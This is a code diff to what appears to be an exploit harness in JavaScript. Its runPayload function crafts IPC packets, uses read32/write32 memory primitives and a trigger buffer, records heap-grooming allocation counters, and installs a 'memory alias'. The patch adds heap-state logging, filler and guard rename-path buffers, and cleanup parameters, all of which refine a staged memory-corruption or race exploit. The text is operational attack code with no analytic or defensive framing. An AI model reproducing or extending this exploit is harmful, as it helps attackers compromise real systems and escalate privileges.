@@ -83,6 +83,7 @@ const {
     ipcWriteFileChecked,
     prepPacket,
     read32,
+    readAllocationCounters,
     sendIPC,
     write32,
     writeStr,
@@ -946,6 +947,9 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
     }
 
     const {pktBuf} = sessionSetup;
+    var heapBaseline = readAllocationCounters(handles.rootSession, pktBuf);
+    await emitStage("Heap baseline: counter5=0x" +
+        (heapBaseline ? heapBaseline[5].toString(16) : "unavailable"));
 
     const scratch = await createScratchTree({
         config, helpers,
@@ -973,6 +977,7 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         // keep the allocation scope alive because a worker may still use it.
         attemptState.workersQuiesced = false;
         const cleanupOptions = {...options,
+            dirtyFileSize: config.DIRTY_FILE_SIZE,
             candidateCacheNeedsRetirement: Boolean(
                 options.candidateCacheNeedsRetirement ||
                 attemptState.candidateCacheRetirementRequired)};
@@ -1029,6 +1034,16 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         await emitStage("Could not prepare worker buffers.");
         return;
     }
+    const renamePathBuffers = {
+        fillerSource: {address: buffers.fillerBuf0, size: 16,
+            expected: buffers.fillerSrc},
+        fillerDestination: {address: buffers.fillerBuf1, size: 0x7F0,
+            expected: buffers.fillerDst},
+        guardSource: {address: buffers.guardBuf0, size: 0x301,
+            expected: buffers.guardPath},
+        guardDestination: {address: buffers.guardBuf1, size: 0x301,
+            expected: buffers.guardPathC}
+    };
 
     const packets = buildIpcRequests({
         config,
@@ -1121,6 +1136,7 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         selectedDir: scratch.selectedDir,
         setupPath: scratch.setupPath, setupPkt: scratch.setupPkt,
         triggerBuf: buffers.triggerBuf,
+        renamePathBuffers,
         timingBaseline,
         allowTimingAdjustments,
         shouldStop: () => timingPersistence?.stopRequested === true
@@ -1230,6 +1246,18 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
 
     // -- Phase 6: cache alias -------------------------------------------
 
+    var aliasHeapCounters = readAllocationCounters(handles.rootSession, pktBuf);
+    var aliasHeapCounter5 = aliasHeapCounters ? aliasHeapCounters[5] : null;
+    var aliasHeapDelta = aliasHeapCounter5 !== null && heapBaseline
+        ? aliasHeapCounter5 - heapBaseline[5] : null;
+    await emitStage("Heap before memory alias: counter5=" +
+        (aliasHeapCounter5 !== null
+            ? "0x" + aliasHeapCounter5.toString(16) : "unavailable") +
+        "; delta-vs-attempt-start=" +
+        (aliasHeapDelta === null ? "unavailable" :
+            (aliasHeapDelta < 0 ? "-0x" + (-aliasHeapDelta).toString(16)
+                : "+0x" + aliasHeapDelta.toString(16))));
+
     await emitStage("Installing the memory alias...");
     const aliasStartedAt = Date.now();
     cleanupWorkerStateSafe = false;
@@ -1267,6 +1295,7 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         preSendIndex: waveInfrastructure.preSendIndex,
         setupPath: scratch.setupPath, setupPkt: scratch.setupPkt,
         triggerBuf: buffers.triggerBuf,
+        renamePathBuffers,
         reportProgress: emitStage,
         shouldStop: () => timingPersistence?.stopRequested === true
     });
@@ -1619,7 +1648,8 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
             storageHandle: handles.storageHandle,
             temporaryHandle: 0,
             triggerHandle: handles.triggerHandle,
-            workerStateSafe: promotion.workerStateSafe
+            workerStateSafe: promotion.workerStateSafe,
+            dirtyFileSize: config.DIRTY_FILE_SIZE
         });
 
         attemptState.promotionRetained = true;
@@ -1697,7 +1727,8 @@ async function runPayload(attemptState, allowTimingAdjustments = true,
         storageHandle: handles.storageHandle,
         temporaryHandle: 0,
         triggerHandle: handles.triggerHandle,
-        workerStateSafe: retired.workerStateSafe
+        workerStateSafe: retired.workerStateSafe,
+        dirtyFileSize: config.DIRTY_FILE_SIZE
     });
 
     await emitVerboseStage(formatCleanupResult(cleanup, retired.workerStateSafe));
@@ -1730,7 +1761,8 @@ async function performStopAndCleanup({
     addressCopy = null,
     candidateCacheNeedsRetirement = false,
     workerStateSafe = true,
-    domainSession = null
+    domainSession = null,
+    dirtyFileSize = 0
 }) {
     await emitVerboseStage("Stopping reason: " + reason);
 
@@ -1782,7 +1814,8 @@ async function performStopAndCleanup({
         temporaryHandle: handles?.preserveTemporaryHandleForCleanup
             ? 0 : handles?.temporaryHandle || 0,
         triggerHandle: handles?.triggerHandle || 0,
-        workerStateSafe: finalWorkerStateSafe
+        workerStateSafe: finalWorkerStateSafe,
+        dirtyFileSize
     });
 
     await emitVerboseStage(formatCleanupResult(cleanup, finalWorkerStateSafe));
